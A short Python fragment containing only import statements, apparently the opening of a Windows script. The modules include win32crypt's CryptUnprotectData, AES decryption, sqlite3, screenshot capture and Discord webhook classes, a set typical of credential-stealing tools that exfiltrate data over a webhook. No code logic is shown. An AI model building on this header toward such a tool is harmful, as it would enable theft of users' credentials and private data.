import base64
import difflib
import json
import os
import winreg
from base64 import b64decode
from json import load, loads
from platform import platform
from re import findall, match
from shutil import copy2
from sqlite3 import connect
from subprocess import PIPE, Popen
from threading import Thread
from time import localtime, strftime
from urllib.request import urlopen
from zipfile import ZipFile
import psutil
import requests
from Crypto.Cipher import AES
from cryptography.fernet import Fernet
from discord import Embed, File, RequestsWebhookAdapter, Webhook
from pyautogui import screenshot
from win32crypt import CryptUnprotectData
import base64